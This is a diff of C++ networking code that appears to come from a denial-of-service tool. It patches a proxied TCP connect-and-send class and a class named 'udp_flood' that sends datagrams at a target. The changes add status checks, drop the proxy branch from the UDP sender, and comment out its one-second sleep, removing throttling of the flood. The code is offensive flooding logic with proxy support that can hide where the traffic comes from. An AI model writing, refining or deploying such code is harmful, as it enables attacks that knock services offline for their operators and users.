@@ -191,39 +191,48 @@ namespace net
 				bool debug = false)
 				: address(address)
 		{
+			proxysocketconfig proxysock_cfg;
 			if (proxy)
 			{
-				auto proxysock_cfg = proxysocketconfig_create_direct();
+				proxysock_cfg = proxysocketconfig_create_direct();
 				if (debug)
 					proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
 				proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
 				proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy->get_ip().c_str(), proxy->get_port(), proxy_user, proxy_password);
 				char* errmsg;
-				if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
+				if (status && (socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
 					status = false;
 			}
 			else
 			{
-				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
+				if (status && ::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
 					status = false;
 			}
 			
-			if (::send(socket, data.c_str(), data.size(), 0) < 0)
+			if (status && ::send(socket, data.c_str(), data.size(), 0) < 0)
 				status = false;
 			
-			char tmp;
-			size_t recved;
-			if (debug)
-				printf("data = R\"(");
-			for (size_t i = 0; ((recved = ::recv(socket, &tmp, sizeof tmp, MSG_DONTWAIT) >= 0) ||
-								errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+			if (status)
 			{
-				::usleep(1000);
+				status = false;
+				char tmp;
+				size_t recved;
 				if (debug)
-					if (recved > 0) printf("\\%x", tmp);
+					printf("data = R\"(");
+				for (size_t i = 0; ((recved = ::recv(socket, &tmp, sizeof tmp, MSG_DONTWAIT) >= 0) ||
+									errno == EWOULDBLOCK || errno == EAGAIN) && i < MAX_QUERIES; ++i)
+				{
+					::usleep(1000);
+					if (debug)
+						if (recved > 0)
+						{
+							printf("\\%x", tmp);
+							status = true;
+						}
+				}
+				if (debug)
+					printf(")\"\n");
 			}
-			if (debug)
-				printf(")\"\n");
 		}
 		
 		inline operator bool()
@@ -245,26 +254,14 @@ namespace net
 	class udp_flood
 	{
 	public:
-		inline udp_flood(const inet_address& address, const std::string& data, const inet_address* proxy, bool debug = false)
+		inline udp_flood(const inet_address& address, const std::string& data, bool debug = false)
 				: address(address), socket(::socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))
 		{
-			if (proxy)
-			{
-				std::string req_buf(PROXY_CONNECT " ");
-				req_buf += address.get_ip();
-				req_buf += ':';
-				req_buf += std::to_string(address.get_port());
-				req_buf += data;
-				
-				if (::sendto(socket, req_buf.c_str(), req_buf.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
-					< 0)
-					status = false;
-			}
-			else if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address)
-					 < 0)
+			if (status &&
+				::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
 				status = false;
-			
-			::sleep(1);
+
+//			::sleep(1);
 
 //			char tmp[128];
 //			auto addr = address.address;
